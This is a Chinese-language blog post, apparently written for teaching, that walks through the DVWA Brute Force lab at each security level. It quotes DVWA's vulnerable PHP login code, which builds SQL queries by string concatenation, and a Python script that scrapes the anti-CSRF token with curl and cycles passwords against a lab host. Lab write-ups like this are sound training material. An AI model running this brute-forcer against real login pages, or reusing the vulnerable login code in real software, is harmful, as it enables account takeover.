---
layout: post
title: "DVWA Brute Force (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_BruteForce
author: ""
tags: ['DVWA', 'BruteForce']
---



# DVWA Brute Force (教學用)
###### tags: `DVWA`




## low


get 請求
```htmlembedded
<form action="#" method="GET">
    Username:<br />
    <input type="text" name="username" /><br />
    Password:<br />
    <input type="password" autocomplete="off" name="password" /><br />
    <br />
    <input type="submit" value="Login" name="Login" />
</form>

```


BP抓包，放到intruder

password 的ADD 標記，表示說要爆破這裡。

使用sniper mode 假設我們要狙擊 admin 這個用戶。

payload 設置 runtime file

選擇你自己的字典檔。

如果字典夠強大，恭喜成功


### code:

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

    //var_dump($query);
    //exit();



    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```


沒有防禦。






## medium


### code:
```php
 <?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>

```


sleep( 2 ) 失敗加上 2秒，所以也沒啥用。






## high
```http
GET /vulnerabilities/brute/?username=123&password=123&Login=Login&user_token=5237d2b1f69c69e5695819649ac71df8 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/vulnerabilities/brute/
Cookie: PHPSESSID=5b3b866450ea4fb9b8cfa16f610a6065; security=high
Upgrade-Insecure-Requests: 1


```


多了 user_token 


原本BP 有個好插件 CSRF TOKEN TRACKER 幫我們自動抓token 不過不知道更新到哪個版本，不能用了。


那麼自己幹一個爬蟲吧。試過 js 無法抓不同域的東西。



### bf.py:

我這邊偷懶，不想用 python 的 urllib 庫，我用curl 工具來抓。

關於curl 的命令生成，我建議用postman 去自動生成，不然太累了。

```
import os
import re


pwd_list = ['admin','123','666','777','111']





for pwd in pwd_list:

	
	host = "http://192.168.43.96/vulnerabilities/brute/"
	username = "?username=admin"
	password = "&password="
	login="&Login=Login"
	user_token="&user_token="


	# cmd execute curl and get token 
	#############################################
	
	cmd = "curl -s --location --request GET " + host + " --header 'Cookie: PHPSESSID=5b3b866450ea4fb9b8cfa16f610a6065; security=high' "
	cmd_result = os.popen(cmd)


	pattern = "(?<=user_token\' value=\')\w*"
	#re.findall return a list 
	regex_result = re.findall(pattern , cmd_result.read())
	
	token = ''.join(regex_result)
	#############################################

	password += pwd
	user_token += token	
	url = host + username + password + login + user_token
	
	url ="'" + url + "'"
	
	 
	
	#final request 	
	cmd2 = "curl -s --location --request GET " + url + " --header 'Cookie: PHPSESSID=5b3b866450ea4fb9b8cfa16f610a6065; security=high' "
	cmd2_result = os.popen(cmd2)	
	
	
	#成功登入會有以下字串
	key_word = "Welcome to the password protected area admin"
	#搜索字串
	find_result = cmd2_result.read().find(key_word)
	#有找到就顯示密碼
	if(find_result != -1):
		print("password found: "+pwd)
	
	
```



### code: 
```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```


防禦手段:

sleep( rand( 0, 3 ) )

token










## impossible



code 關鍵點。
```
	// Default values
	$total_failed_login = 3;
	$lockout_time       = 15;
	$account_locked     = false;
```


3次失敗，鎖15分鐘